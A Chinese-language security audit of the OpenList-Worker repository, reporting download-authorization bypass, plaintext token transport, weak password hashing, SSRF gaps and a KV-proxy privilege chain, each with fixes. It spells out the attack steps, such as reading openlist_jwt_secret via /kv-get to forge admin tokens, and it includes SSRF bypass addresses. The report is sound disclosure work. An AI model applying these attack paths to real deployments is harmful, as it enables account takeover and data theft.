# OpenList-Worker 深度安全审查报告

- **目标仓库**：`https://github.com/WMZZwmzz/OpenList-Worker`（分支 `main`）
- **审查快照**：commit `7c911d8`（2026-10-29 01:05），已用 `git hash-object` 逐文件比对，确认本地快照与 HEAD 一致
- **审查日期**：2026-10-31（第一轮 + 第二轮补充）
- **审查方式**：全量源码静态审计 + 关键逻辑本地复现 + 依赖漏洞库比对（OSV）+ 完整提交历史密钥扫描
- **代码规模**：464 个 `.ts` 文件 / 108,036 行 / 176 条 HTTP 路由 / 82 个存储驱动 / 223 处 `fetch` 调用 / 5 个 EdgeOne Edge Function
- **仓库自带测试**：106 个 `*.test.ts`（含 crypto、SSRF、权限、租户隔离等专项测试）
- **提交历史**：1,048 个 commit（2026-07-10 ~ 2026-10-29），两个分支 `main` 与 `theme/openlist-moe`

---

## 一、结论摘要

这是一份**已经过多轮安全加固**的代码：路径规范化、权限位、下载签名、SSRF 逐跳校验、ZIP-Slip 防护、软链 realpath、TOTP 重放防护、登录锁定、WebAuthn challenge 校验等均有实现，且注释里明确记录了历史缺陷编号（C-1/N-1/M-1…）。整体工程质量高于同规模开源项目。

但仍有 **4 项高危、13 项中危、10 项低危** 问题，其中下列四条最值得立即处理：

| 编号 | 问题 | 严重度 | 利用前提 |
|---|---|---|---|
| **H-1** | `/d`、`/p` 公开下载端点不参与 `base_path` / `allow_guest` 授权模型，可在收紧配置后跨租户读取任意已知路径文件 | 高 | 无需认证，只需知道路径 |
| **H-2** | Quark/UC TV 驱动用**明文 HTTP** 传输 `refresh_token` | 高 | 管理员启用该驱动即持续暴露 |
| **H-3** | 运行时依赖存在已披露漏洞：hono 4.12.28（9 项，6 项与本服务相关）、mysql2 3.11.0（明文凭据降级） | 高 | 视部署形态 |
| **H-4** | 密码存储为**单轮 SHA-256**（无慢哈希/无迭代），离线爆破成本极低 | 高（架构级） | 需先拿到库 |

统计分布：

```
高危 4  ┃████
中危 13 ┃█████████████
低危 10 ┃██████████
```

第二轮补充审查（提交历史 + 适配层 + EdgeOne KV 数据面 + SSO）新增 3 项中危、2 项低危，未推翻第一轮结论，但对 H-1 的适用条件做了收窄（见 §3.1 的「前提修正」）。新增项里 **M-11（KV 代理把管理员会话升级为不可吊销的根密钥）** 应当与高危同批修复。

---

## 二、攻击面地图

```
                         ┌──────────────────────────────┐
   匿名 ────────────────►│ /d  /p  /sd  (raw.ts)        │  公开下载，仅靠 sign 判定
                         │ /dav          (webdav.ts)     │  Basic / Bearer
                         │ /s3           (s3.ts)         │  Bearer JWT（无 SigV4）
                         │ /api/auth/*   (auth/sso/webauthn) │ 登录、SSO、Passkey
                         │ /api/public/* (public.ts)     │ 设置/初始化/诊断
                         │ /api/share/create             │ 需登录 + SHARE 位
   普通用户 ────────────►│ /api/fs/*     (fs.ts)         │ 权限位 + meta ACL
                         │ /api/share/create             │
   管理员 ──────────────►│ /api/admin/*  (admin.ts)      │ 全局 adminAuthMiddleware
                         │ /api/task/*   (task.ts)       │ CRON_SECRET 或 admin
                         │ /api/mcp/*    (mcp.ts)        │ admin
                         │ /api/debug/*  (debug.ts)      │ admin
                         └──────────────────────────────┘
```

关键数据流：`路径 → canonicalVirtualPath() → getActualPath()（套 base_path）→ resolvePath()（多重解码+折叠）→ 驱动`。这条链路是本项目安全模型的核心，实现质量较高（多处刻意保持"判定与寻址同源"）。

---

## 三、高危发现

### H-1　公开下载端点绕过 `base_path` 与登录态（跨租户读取）

**位置**：`src/backend/server/raw.ts:410-504`、`src/backend/server/raw.ts:506`、`src/backend/server/raw.ts:295`

**机理**

`rawRouter` 同时挂载在 `/d`、`/sd`、`/p`（以及 `/api/d` 等）。非分享分支的访问控制**只有**一条：

```ts
if (await needDownloadSign(c, reqPath)) {
  const sign = c.req.query("sign") || ""
  if (!await verifyDownloadSign(c, reqPath, sign)) return c.text("sign verify failed", 401)
}
const resolved = await resolvePath(reqPath, c.env)   // ← 全局虚拟路径，未套 base_path
```

`needDownloadSign()`（`pkg/sign.ts:197`）在以下条件全部不成立时返回 `false`：

- `sign_all === "true"`（默认 `"false"`，`public.ts:431`）
- `link_expiration > 0`（默认 `"0"`，`public.ts:430`）
- 目标路径被带密码的 meta 覆盖
- 目标路径被 `read_users` 白名单限制

也就是说，**默认配置下 `/d/{任意路径}` 不需要任何凭证**，且 `resolvePath` 使用的是全局路径，不经过 `getActualPath()`，因此：

1. 未登录者可下载任意文件（绕过 `allow_guest=false`）；
2. `base_path=/alice` 的受限用户，其文件可被任何知道路径的人读取（租户隔离失效）；
3. proxyUpstream 还显式返回 `Access-Control-Allow-Origin: *`（`raw.ts:295`），任意站点可 `fetch()` 并读取响应体，路径一旦泄露即可被第三方页面直接抓取。

**验证**：`needDownloadSign` 的三条分支均为纯配置读取，无隐含校验；`raw.ts` 全文无 `isWithinUserRoot` / `getActualPath` 调用。这是代码级确定结论，不需要运行。仓库自带的 `server/signed_link_auth.test.ts:55` 明确写着 “needSign: false by default — endpoint is public”，说明这是**有意为之**的行为，不是漏写。

**前提修正（第二轮）**：默认库里 guest 是 `role=1 / permission=0 / base_path="/"`（`internal/model/db.ts:837-848`），因此在**默认配置下匿名本来就能通过 guest 列根目录**，此时 H-1 并不额外扩大读取面。真正的风险窗口是三处收紧配置之后：

| 管理员做了 | `/d` 的实际效果 |
|---|---|
| 关闭 `allow_guest`（很多公网部署会关） | 匿名登录/列目录被拦，但 `/d/{全局路径}` 仍可下载 —— **完全绕过** |
| 给 guest 设了受限 `base_path` | guest 只能看自己目录，但 `/d` 未套 `base_path`，**租户边界失效** |
| 普通用户 `base_path=/alice` | 该用户不能列 `/bob`，但只要知道路径就能 `/d/bob/x` 下载 |

所以准确表述是：**`/d`、`/p` 不参与 `base_path` 与 `allow_guest` 的授权模型**，一旦管理员按“收紧”思路配置了 guest 或租户目录，反而留下了一条不看配置的旁路。

**为何算高危而不是"与 Go 一致"**：Go 版同样无 Auth 中间件，但 Go 版通常是**单用户自托管**；本项目以 Worker 形态面向多租户部署，`base_path` 是唯一的租户边界，而这条边界在 `/d` 上不存在。

**修复建议**

1. `sign_all` 默认改为 `true`（新部署），或在 `needDownloadSign` 中对"非 root 的 `base_path` 用户"始终返回 `true`；
2. `/d` 分支增加 `isWithinUserRoot(user, reqPath)` 复核（用户为 null 时按 guest 根）；
3. 去掉代理下载的 `Access-Control-Allow-Origin: *`，改为同源或可配置白名单；
4. 若要保持兼容，至少在 `/api/public/env_check` 中把"`sign_all=false` 且存在非 root 用户"标为 error 级 issue。

---

### H-2　Quark / UC TV 驱动以明文 HTTP 传输长期凭据

**位置**：`src/backend/drivers/quark_uc_tv/util.ts:41`、`:49`、`:159-166`

```ts
codeApi: "http://api.extscreen.com/quarkdrive"   // 明文
...
const resp = await fetch(`${this.conf.codeApi}${pathname}`, {
  method: "POST",
  body: JSON.stringify({ req_id, ...deviceQuery(), refresh_token: this.addition.refresh_token }),
})
```

`refresh_token` 是网盘账号的长期凭据。请求走明文 HTTP，链路上任何代理、NAT、运营商侧设备、旁路监听都能直接截获，且响应里返回的新 `refresh_token` 同样明文回传。触发条件是"管理员挂载该驱动 + 令牌到期自动刷新"，无需攻击者交互。

**修复**：改为 `https://`；若上游仅支持 HTTP，应删除该驱动或要求显式确认风险。

---

### H-3　运行时依赖存在已披露漏洞

用 OSV 逐个核对了 `package.json` 中**实际被服务端引用**的依赖（`hono`、`mysql2`、`zod`），确认受影响版本区间：

| 依赖 | 当前 | 修复版本 | 漏洞 | 影响 |
|---|---|---|---|---|
| `hono` | 4.12.28 | 4.12.34 / 4.13.5+ | GHSA-5r4p-p66f-jhc7 | `serveStatic` 二次解码，**绕过静态路径上的中间件** |
| | | 4.12.34 | GHSA-8j4g-w8fx-2239 | CORS 中间件 ReDoS（`Access-Control-Request-Headers`） |
| | | 4.12.34 | GHSA-f23p-vx2j-j53r | `memo()` 跨请求保留 SSR 输出（跨用户数据泄露） |
| | | 4.12.34 | GHSA-54fx-42gc-7vw4 | 语言中间件算法复杂度 DoS |
| | | 4.13.5 | GHSA-crvj-82cr-hjcx | **query 解析会读取 URL fragment 之后的参数**，造成缓存键/代理语义差异 |
| | | 4.13.5 | GHSA-g6gw-c38x-mqfc | `parseBody()` 点号嵌套导致内存耗尽 |
| `mysql2` | 3.11.0 | 3.22.0 | GHSA-3f6p-5ww8-9rcr | **认证插件降级为 `mysql_clear_password`，泄露明文口令** |
| | | 3.23.1 | GHSA-rgwj-5xj2-c3m3 | 压缩协议解压炸弹 DoS |
| `zod` | 3.23.8 | 4.6.6 | GHSA-mrhx-c7xc-m3w5 | 超大集合校验内存耗尽 |

`hono` 的 fragment-query 差异与本项目关联最大：`rateLimitMiddleware`、`needDownloadSign`、`verifyDownloadSign` 都通过 `c.req.query()` 取 `sign`/`token`，而缓存层（CDN/Workers 缓存）对 URL 的解析可能与 hono 不一致，存在"签名绕过"或"限流绕过"的理论路径。建议直接升到 4.13.11+（`serveStatic` 修复版本）。

**未受影响**：`handlebars`（3 个 CRITICAL）虽在依赖里，但全仓库无 import，不会被打包；`axios` 仅前端使用（12 项，含 ReDoS/SSRF，属浏览器侧，风险较低但仍建议升到 1.20.0）。

---

### H-4　密码存储使用单轮 SHA-256（架构级）

**位置**：`src/backend/pkg/password.ts:15-38`

```ts
STATIC_HASH_SALT = "https://github.com/alist-org/alist"   // 固定、公开
staticHash(pwd)   = sha256(`${pwd}-${STATIC_HASH_SALT}`)
saltedHash(s, s2)= sha256(`${s}-${salt}`)                 // salt 16 位
PwdHash           = saltedHash(StaticHash(pwd), salt)
```

两个问题：

1. **无慢哈希**：整个流程只有 2 次 SHA-256，单张消费级 GPU 可对 8 位口令做到每秒数十亿次尝试；固定前缀 `STATIC_HASH_SALT` 还是公开常量，可预计算。
2. **`/login/hash` 是 pass-the-hash 面**：客户端提交的 `sha256(password + 公开盐)` 本身就是"可重放的等价凭据"（`auth.ts:876-966` 直接比对）。一旦该值经 XSS/日志/代理泄露，攻击者无需还原明文即可登录。

这是为兼容 Go 版 OpenList 数据格式所做的取舍，不是本项目的独立缺陷，但**在 Worker 这种多租户、数据库可能落在第三方（KV/D1/MySQL）的形态下，风险被放大**。

**建议**：新增 `password_algo` 字段，写入时用 Argon2id（`hash-wasm` 已在依赖里）或 PBKDF2-SHA256 ≥ 210,000 次；登录时按字段识别并透明升级；保留旧格式读兼容。若坚持兼容，至少在管理后台对"密码强度 < 12 位"的账号给出强制提示。

---

## 四、中危发现

### M-1　限流键退化为常量 `"unknown"`，单客户端可瘫痪全站

**位置**：`src/backend/pkg/client-ip.ts:39`、`src/backend/server/router.ts:54-94`

非 Cloudflare 运行且未设 `TRUST_PROXY_HEADERS=1` 时，`clientIpFromContext()` 恒返回 `"unknown"`。`rateLimitMiddleware` 直接用它作 Map 键：

```ts
const ip = getClientIp(c)              // "unknown"
ipReqCounts.set(ip, { start: now, count: 1 })
if (rec.count > ipLimit) return c.json({...}, 429)
```

于是**所有访客共享一个计数器**：配置 `ip_limit=60` 时，任意一个脚本发 61 次请求，全站（含登录、API）在接下来一分钟内全部 429。EdgeOne / Vercel / 自托管默认都拿不到可信 IP。

`auth.ts` 已经意识到同类问题并做了"IP 不可信则关闭 IP 维度"（`loginLockByIpEnabled`），但 `router.ts` 的限流没有同步这层保护。

**修复**：`ip === "unknown"` 时跳过 IP 维度限流（或改用"全局固定窗口 + 更宽松阈值"），并在启动日志中告警。

### M-2　分享浏览绕过 `disable_index` 与 `hide` 规则

**位置**：`src/backend/server/fs.ts:530-557`（分享列表）、`fs.ts:571`（非分享路径才有 `disable_index` 检查）

```ts
// 分享分支：直接列出 realPath 下的全部内容
const { content, provider } = await listItems(shareRes.realPath!, requestContext)
const normalized = content.map(...)      // ← 没有 isHidden() 过滤
return c.json({ ... content: pagedContent ... })
```

两处不一致：

1. `disable_index`（"该存储禁止目录列表"）只在普通分支检查，分享分支不检查 —— 与源码注释"避免分享单文件后被逐级浏览整个存储"的意图相悖；
2. 列表结果未经过 `isHidden(meta, ...)` 过滤，被 meta.hide 隐藏的文件名会原样出现在分享页。

**修复**：分享分支复用同一套 `isStorageIndexDisabled()` 与 `isHidden()` 逻辑。

### M-3　WebDAV `PUT` 无体积上限

**位置**：`src/backend/server/webdav.ts:391-400`

```ts
const buffer = Buffer.from(await c.req.arrayBuffer())   // 无 MAX_UPLOAD 检查
await putItem(actualPath, buffer, ctx)
```

`/fs/put` 与 S3 `PutObject` 都走了 `readBodyWithinLimit()`（`pkg/upload-limit.ts`），唯独 WebDAV 漏掉。持有 `WEBDAV_MANAGE` 位的用户可发送任意大小请求体，在 Node/自托管部署上直接 OOM。

### M-4　部分驱动对用户可控 URL 缺少 SSRF 校验

| 位置 | 问题 |
|---|---|
| `drivers/url_tree/driver.ts:172-181` | `assertSafeUrl` 后 `fetch(url, { method: "HEAD" })` **未禁用自动重定向**，302 可跳到内网；内网响应的 `Content-Length` 会被当作文件大小回显 |
| `drivers/chunk/driver.ts:368` | 对底层驱动返回的 `raw_url` 直接 `fetch()`，无 `assertSafeUrl`、无逐跳校验；chunk 会把上游字节回传，构成**可读 SSRF** |
| `drivers/crypt/driver.ts:225` | 同上 |
| `drivers/teambition/util.ts:89-91`、`drivers/189/util.ts:682-686`、`drivers/terabox/util.ts:250-255` | 把 `addition` 里的 Cookie 发往云端响应给出的下载 URL，未校验目标 host；恶意/被劫持的 CDN 响应可窃取会话 Cookie |

`raw.ts` 的 `safeProxyFetch` 已经实现了"手动跟随 + 逐跳断言 + 跨域剥离敏感头"（`raw.ts:99-132`），这些驱动没有复用。

### M-5　SSRF 防护仅做字面量判定，无 DNS 解析

**位置**：`src/backend/pkg/http.ts:259-386`

`isSafeUrl()` 检查 hostname 是否命中私网/元数据/保留段，但**不解析 DNS**。因此 `http://attacker.example/`（A 记录指向 `127.0.0.1` 或 `169.254.169.254`）会通过校验。代码只硬编码了 `nip.io`/`xip.io`/`localtest.me` 等几个 DNS rebinding 服务。

在 Cloudflare Workers 上实际影响有限（平台网络层不可达私网），但仓库同时支持 **Node/Docker/EdgeOne 云函数**（`sea-config.json`、`cloud-functions/`、`node-functions/`），这些环境里 fetch 能直达 VPC 内网与云元数据。

另外，我用仓库自身的判定逻辑复刻验证了一个边界（`openlist-audit-poc/ssrf_check.mjs`）：

```
BLOCK  http://127.0.0.1/                 host=127.0.0.1
BLOCK  http://[::ffff:127.0.0.1]/        host=[::ffff:7f00:1]
ALLOW  http://[::7f00:1]/                host=[::7f00:1]      ← IPv4-compatible，等价 127.0.0.1
BLOCK  http://[64:ff9b::7f00:1]/         host=[64:ff9b::7f00:1]
BLOCK  http://[2002:7f00:1::]/           host=[2002:7f00:1::]
```

`::7f00:1`（IPv4-compatible IPv6）未被覆盖。现代内核多不支持该形式路由，实际可利用性低，但建议一并归一化。**主要修复仍是 DNS 解析后再判定**（Node 环境用 `dns.lookup` + `isRestrictedIpv4`；Workers 环境保持现状并文档说明）。

### M-6　目录访问口令（meta password）可无限暴力尝试

**位置**：`src/backend/pkg/meta.ts:128-134`、`src/backend/server/fs.ts:562`、`fs.ts:818`

`canAccess()` 对 `meta.password` 只做恒时比较，**没有任何失败计数或锁定**；`/api/fs/list`、`/api/fs/get` 直接透传 `body.password`。分享提取码有 8 次/10 分钟的节流（`internal/op/share.ts:76`），目录口令没有 —— 而两者常是同样的 4~6 位短码。匿名 guest 可对已知目录高速试码。

**修复**：复用 `pwdFailures` 那套计数器（键改为 `metaId + clientKey`），并对 `password` 参数长度设上限。

### M-7　上传体"先读后判"，可内存耗尽

**位置**：`src/backend/pkg/upload-limit.ts:readBodyWithinLimit`

```ts
const buffer = Buffer.from(await c.req.arrayBuffer())   // 先整体读入
if (buffer.length > max) return { ok: false, limit: max } // 再判断
```

`Content-Length` 预检能挡住"诚实"的超大请求，但 `Transfer-Encoding: chunked` 或伪造长度时，整个 body 仍会先进入内存。自托管部署上 25MB 上限形同虚设（可发 2GB）。

**修复**：按流读取并累加计数，超限立即 `cancel()`。

### M-8　加密密钥与密文存放在同一介质

**位置**：`src/backend/server/middlewares.ts:93-219`、`src/backend/internal/model/db.ts:2017-2110`

`DB_CIPHER` 使用的密钥来自 `JWT_SECRET` 或 `openlist_encryption_secret`（自动生成后写入 **KV/D1**）；而 `storages[].addition`（网盘 AK/SK、Cookie）、`users[].password`、`metas[].password` 的密文也存在同一个 KV/D1 里。

结果：能读到数据库的人（D1 导出、KV 备份泄露、MySQL 只读账号）通常也能读到密钥槽位，加密只防"存储层顺手看见"，不防"存储被拖库"。这属于可接受的设计权衡（Cloudflare 场景下 secrets 与 binding 是两套权限），但应在文档中明确威胁模型；更好的做法是要求高安全部署用 `wrangler secret put JWT_SECRET` 且不要把密钥写回 KV。

### M-9　初始化接口存在"抢注"窗口

**位置**：`src/backend/server/public.ts:699-857`

`POST /api/public/init/setup` 的唯一前置条件是"没有已设密码的管理员"。部署完成到管理员首次访问之间，任何知道域名的人都可以先注册 admin。Go 版同样如此，但 Worker 部署（`*.workers.dev`、`*.edgeone.cool`）域名更易被扫描。

**建议**：初始化时要求携带部署侧生成的一次性 token（打印到日志/环境变量），或仅在 `Host` 为 localhost 时允许。

### M-10　插件系统存储任意脚本且无签名校验

**位置**：`src/backend/server/admin.ts:5401-5507`

`/api/admin/plugin/install` 接受 `script_content` / `style_content` 原文入库，`manifest_url` 只做 SSRF 校验、不做内容签名或哈希校验。若前端按"同源脚本"注入执行，等价于把**存储型 XSS / 供应链后门**的入口交给任何能拿到管理员会话的人（包括通过 M-1 或 XSS 拿到会话的攻击者）。

由于前端主程序（`dist/`）不在仓库中，无法确认其注入方式；若采用 `eval`/`new Function`，当前 CSP（`script-src 'self'`，无 `unsafe-eval`）会拦住；若以 `<script>` 标签注入同源 URL，CSP 不会拦。

**建议**：为插件包增加签名（Ed25519）+ 白名单源；至少记录安装者与哈希，并在 UI 明示"高权限插件"。

### M-11　EdgeOne KV 代理把「管理员会话」升级为「全站根密钥」

**位置**：`functions/_kv-proxy.js:55-76`、`functions/_kv-proxy.js:205-251`、`functions/kv-get/index.js:8-24`、`functions/kv-put/index.js:9-34`、`src/backend/server/middlewares.ts:30,79-87`

EdgeOne 部署提供 4 个公开可访问的边缘函数 `/kv-get`、`/kv-put`、`/kv-list`、`/kv-delete`，鉴权只有两条路：`X-Internal-Call` 等于完整 `JWT_SECRET`，或携带 **role=2 的 JWT**（`_kv-proxy.js:243`）。通过后 **对 key 不做任何限制**。

而主密钥就存在同一个 KV 命名空间里：

```ts
// middlewares.ts:30
const JWT_SECRET_KV_KEY = "openlist_jwt_secret"
// :79-87  setup 阶段把自动生成的密钥写进 KV
await writePersistedSecret(env, JWT_SECRET_KV_KEY, generated)
```

于是出现一条稳定的提权链：

```
任意 admin JWT  ──► GET /kv-get?key=openlist_jwt_secret   ──► 拿到 HS256 主密钥
                                                              │
       ┌──────────────────────────────────────────────────────┴──────────────┐
       ▼                                                                     ▼
离线伪造任意用户 JWT（含 admin、含 7 天有效期）              解密 DB_CIPHER 密文（M-8）
jti / epoch / 改密吊销全部无效                                导出备份即可还原网盘 AK/SK、Cookie
```

`POST /kv-put` 还能反向写入该 key：把 `openlist_jwt_secret` 改成攻击者已知值 → 全站会话立即失效（**持久化 DoS**），且攻击者从此可离线签发合法 admin 令牌（**密钥固定**）。`/kv-delete?key=openlist_jwt_secret` 则直接让所有实例重新生成密钥。

这条链的意义不是"admin 能做什么"（admin 本来就全权），而是**凭据的性质从"可吊销的会话"变成"不可吊销的根密钥"**：一个通过 XSS、共享账号、M-1 限流绕过或日志泄漏拿到的管理员 token，本来会在 7 天后过期或改密即失效，现在可以永久化。同类问题还有 `X-Internal-Call` 直接传 `JWT_SECRET` 本体（`internal/model/store/driver/kv.ts:139-149`），使根密钥出现在每一次后端→边缘的函数调用里。

**适用范围**：密钥落 KV 只发生在"未通过 `wrangler secret` / 环境变量配置 `JWT_SECRET`"的部署（一键部署默认走这条路，`setup` 时自动生成并写入）。若部署方已显式设置 `JWT_SECRET`，KV 里可能根本没有该槽位，提权链断在第一步 —— 但 `/kv-get?key=openlist_db` 仍能直接导出整库，`/kv-put` 仍能整库覆写。

**修复**
1. `/kv-*` 增加 key 前缀白名单（如仅允许 `openlist_db`、`openlist_cache_*`），显式拒绝 `openlist_jwt_secret` / `openlist_encryption_secret`；
2. 内部通道改用**独立**的 `KV_INTERNAL_SECRET`，不要复用 `JWT_SECRET`；
3. 三个写端点加审计日志（谁、什么时间、改了哪个 key）与速率限制；
4. 若必须保留读密钥能力，改为"只能验证、不能导出"的接口（例如服务端代签），不返回密钥原文。

### M-12　SSO `state` 只存进程内 Map：多实例登录失败 + 无上限内存增长

**位置**：`src/backend/server/sso.ts:33`、`:64-90`、`:331-361`、`:430-437`

```ts
const stateStore = new Map<string, StateRecord>()   // 模块级
function generateState(clientId, ip, nonce) {
  const state = randomHex(16)
  stateStore.set(`${clientId}_${state}`, { ip, exp: Date.now() + 300_000, nonce })
  return state
}
```

两个后果：

1. **功能**：Worker / Vercel / EdgeOne 都是多实例。`GET /api/auth/sso` 落在实例 A 写入 Map，IdP 回调 `/api/auth/sso_callback` 大概率落在实例 B —— 查不到 → 直接 400 “incorrect or expired state”。state 校验是 fail-closed 的，所以不是漏洞，但意味着**这套 SSO 在 serverless 上很可能根本登不进去**（除非平台保证同客户端粘性）。
2. **安全**：`stateStore` 只在消费时 `delete`，**没有任何 TTL 清扫**。`GET /api/auth/sso?method=...` 是匿名端点（仅受 `sso_login_enabled` 开关约束），每次请求都往 Map 里塞一条 200 字节左右的记录，5 分钟过期也无人回收。开启 SSO 的部署可被低成本堆积内存（Workers 128 MB 上限）。

**修复**：state 落到 KV/DB（带 TTL），读取即删；本地 Map 只作单请求内的缓存，并设条数上限。

### M-13　SSO 兼容模式把完整 JWT 放进跳转 URL

**位置**：`src/backend/server/sso.ts:631-649`、`:588-596`

```ts
if (useCompat) {
  // 注释原文：「兼容模式默认仍把完整 JWT 放进 URL —— 按决策跳过」
  return c.redirect(`${apiOrigin(c)}/@login?token=${encodeURIComponent(token)}`, 302)
}
```

开启 `sso_compatibility_mode` 后，登录成功会 302 到 `/@login?token=<7 天有效 JWT>`。该 URL 会进入：浏览器历史、`Referer`（若页面含外链/图床）、反向代理与 CDN 的访问日志、以及任何记录 URL 的监控系统。`router.ts:100-105` 对 query token 加了 `no-store` 与 `no-referrer`，只能缓解后两类，**历史记录与前缀日志仍在**。

同一模式下 `get_sso_id` 也把 `sso_id` 放在 URL（`:591`），可被用来做身份绑定期的信息泄漏。

**修复**：把 `SSO_COMPAT_EXCHANGE_CODE` 的默认值改为开启（60 秒单次兑换码），或在兼容模式启动时打印显式警告；前端契约改造完成后移除该分支。

---

## 五、低危发现

| 编号 | 位置 | 问题 |
|---|---|---|
| L-1 | `server/router.ts:315-379` | `/healthz` 未鉴权返回 `storages/users` 数量、存储平台、错误详情，属零成本侦察面 |
| L-2 | `server/admin.ts:4723-4739` | `/admin/setting/list` 明文返回 `api_token`、`sso_client_secret`、`download_sign_secret`、`ldap_bind_password`；建议按 key 打码，编辑时单独取 |
| L-3 | `server/admin.ts:4951-4959` | `meta.path` 只用 `split/filter` 规范化，未折叠 `..`；`/..` 会被 `canonicalVirtualPath` 折叠成 `/`，等于给全站加密码（管理员误配风险） |
| L-4 | `internal/op/share.ts:186-189` | `accessed` 计数 `saveDb()` 未 await，并发下 `max_accessed` 可被超用 |
| L-5 | `server/fs.ts:414-415` | `/fs/list` 的 `per_page` 无上限，`per_page=1e9` 会一次返回全部条目 |
| L-6 | `pkg/http.ts:308-339` | `[::7f00:1]` 等 IPv4-compatible IPv6 未纳入私网判定（见 M-5 验证输出） |
| L-7 | `server/s3.ts:28-49` | S3 网关不实现 SigV4，仅接受 Bearer JWT；任何拿到 JWT 的客户端可长期以该用户身份读写，且 `GET` 直接 302 到未签名的 `/d` |
| L-8 | `theme/openlist-moe/OpenList-Moe.min.js` | 主题 JS 仅 2.6 KB，无 `eval`/`innerHTML`/外联上报；但**前端主程序不在仓库**，XSS 面无法审计（见第六节） |
| L-9 | `pkg/csrf.ts:1-22`、`server/auth.ts:1083-1090` | CSRF 模块与 `csrfProtection` 两套实现**都没有挂载**，但 `GET /api/auth/csrf` 仍签发 token，形成"有防护"的错觉。当前会话只走 Bearer 头，传统 CSRF 不成立，属死代码；一旦将来引入 Cookie 会话就会变成真实缺口 |
| L-10 | `functions/kv-get/index.js`、`kv-list/index.js` | 只导出 `onRequest`、不校验 method：`POST`/`DELETE /kv-get` 同样生效，便于绕过只针对 GET 配置的 WAF 规则与日志告警 |

---

## 六、做得好的地方（不必改）

这些点是同类项目里少见的，审计中确认实现正确，建议保持：

1. **路径判定与寻址同源**：`canonicalVirtualPath()` / `decodePathFully()`（最多 64 轮解码、`...`→`..`、`%2f`→`/`）被 meta 判定、签名计算、`resolvePath` 共用，堵住了"判定看 A、落盘看 B"这一类最典型的越权。
2. **`getActualPath` 的 base_path 钳制**：`collapsePathSegments(decoded, baseStack.length)` 让 `..` 在用户根处被夹住，思路正确。
3. **下载签名用派生密钥**：`hmacSha256("openlist-download-sign-v1", jwtSecret)`，不与 JWT 共用原钥；支持 `download_sign_secret` 轮换。
4. **SSRF 逐跳校验 + 跨域剥离敏感头**：`safeProxyFetch()` 禁用自动重定向、每跳 `assertSafeUrl`、只保留 Range/UA/Accept 等安全头，实现正确。
5. **ZIP-Slip 与软链防护**：`safeArchiveEntryPath()` 先 `decodePathFully` 再逐段拒绝；本地驱动所有 fs 操作前 `realpath` 比对根目录（含"不存在的路径逐级 realpath"）。
6. **认证侧细节**：JWT `alg` pin 为 HS256、`iss/aud` 校验、`jti` 吊销名单、`epoch` 改密失效、`pwd_ts` 指纹、TOTP 单次消费（含跨 isolate 的 DB 记录）、2FA pending 令牌不能当会话用。
7. **登录锁定设计**：区分"IP 维度"与"用户名维度"，IP 不可信时自动关闭 IP 维度并固定用户名维度时长，避免"锁死管理员"。
8. **106 个测试文件**覆盖了 crypto、SSRF 段、权限位、租户隔离、签名等，且注释与测试同名对应，可维护性好。
9. **`functions/_kv-proxy.js` 的验签实现本身是规范的**：`alg` 强校验为 HS256、`exp` 缺失/非数字一律拒绝（注释里写明这是修掉的历史缺陷 H-1）、`nbf` 类型校验、2FA pending 令牌拒绝、`iss/aud` 错值拒绝、常量时间比较且不做密钥截断。问题只在"通过鉴权后能碰哪些 key"（M-11），不在鉴权逻辑。
10. **`scripts/fetch-frontend.mjs` 的供应链防护**：npm tarball 用同一次 registry 元数据的 `dist.integrity`（SRI sha512）或 `dist.shasum` 校验，i18n 包用 GitHub Release 的 `asset.digest`；拿不到摘要锚点直接中断构建（可用 `ALLOW_UNVERIFIED=1` 显式降级）；所有含外部输入的 `git`/`tar` 调用走参数数组而非 shell 拼接。这是我在这类"构建期拉前端产物"的脚本里见过做得最完整的一份。

---

## 七、修复优先级

**P0（本周）**

1. 升级 `hono` → `4.13.11+`（覆盖 serveStatic 绕过 + fragment-query 差异），`mysql2` → `3.23.1+`。
2. `quark_uc_tv` 改用 HTTPS（或下线该驱动）。
3. 为 `/d`、`/p` 增加 `isWithinUserRoot` 复核；新部署默认 `sign_all=true`；移除代理下载的 `ACAO: *`。
4. `/kv-*` 加 key 前缀白名单、显式拒绝密钥槽位；`X-Internal-Call` 改用独立的 `KV_INTERNAL_SECRET`（M-11）。

**P1（两周内）**

5. 限流在 `ip === "unknown"` 时跳过 IP 维度。
6. WebDAV `PUT` 接入 `readBodyWithinLimit`。
7. 目录口令加失败节流；分享列表补 `disable_index` + `isHidden`。
8. `url_tree` HEAD 改 `redirect: "manual"`；`chunk`/`crypt` 的 fetch 接入 `safeProxyFetch`；三个"Cookie 发往云端 URL"的驱动增加 host 白名单。
9. `readBodyWithinLimit` 改为流式计数。
10. SSO `state` 迁到 KV/DB 并带 TTL、读取即删（M-12）。
11. 保护 `/kv-*` 的写端点：审计日志 + 速率限制（M-11 后半）。

**P2（一个月内）**

12. 密码哈希迁移到 Argon2id/PBKDF2（带透明升级）。
13. SSRF 增加 DNS 解析后判定（Node 环境）+ `::7f00:1` 归一化。
14. `/healthz` 与 `/admin/setting/list` 脱敏。
15. 初始化接口加一次性 token。
16. 插件签名与哈希登记。
17. `zod` 升到 4.x（注意 API 变更）或对所有请求体设硬上限以缓解内存耗尽。
18. `SSO_COMPAT_EXCHANGE_CODE` 默认开启，或删除 `/@login?token=` 分支（M-13）。
19. 删除 `pkg/csrf.ts` 与 `/api/auth/csrf`，或在引入 Cookie 会话时真正挂载（L-9）。

---

## 八、审查范围与限制

**已覆盖**：`src/backend/server/*`（全部 15 个路由文件）、`src/backend/pkg/*`（crypto/password/sign/http/path/permission/meta/csrf/audit/upload-limit/local-fs-guard）、`src/backend/internal/{op,model,archive,webdav,mcp,upload,seed,cache,driver}`、`src/backend/drivers/*`（82 个目录横向扫描 + 高风险驱动精读）、`src/backend/index.ts` 中间件顺序、部署适配层（`functions/*`、`api/*`、`node-functions/`、`cloud-functions/`、`middleware.js`、`handler.ts`、`vercel.json`、`serverless.yml`、`edgeone.json`）、`scripts/*`、`wrangler.jsonc` / `.dev.vars.example` / `.github/workflows/*`、`package.json` 依赖、**全部 1,048 个 commit 的文件名历史**（blobless 克隆）。

**未覆盖 / 无法覆盖**：

1. **前端主程序**（Solid.js `dist/`）不在仓库中，只审了 2.6 KB 主题 JS。因此**存储型 XSS**（readme/header 渲染、`customize_head` 注入、插件脚本执行）这一整个面无法结论，需拿到前端源码后单独审。
2. **未运行完整测试套件**：依赖安装需要 pnpm 全量拉取（沙箱网络对 GitHub/npm 较慢），本次以静态审查 + 定向复现（SSRF 判定复刻、OSV 依赖比对、历史密钥扫描）为主。建议在 CI 上补跑 `pnpm test` 作为回归基线。
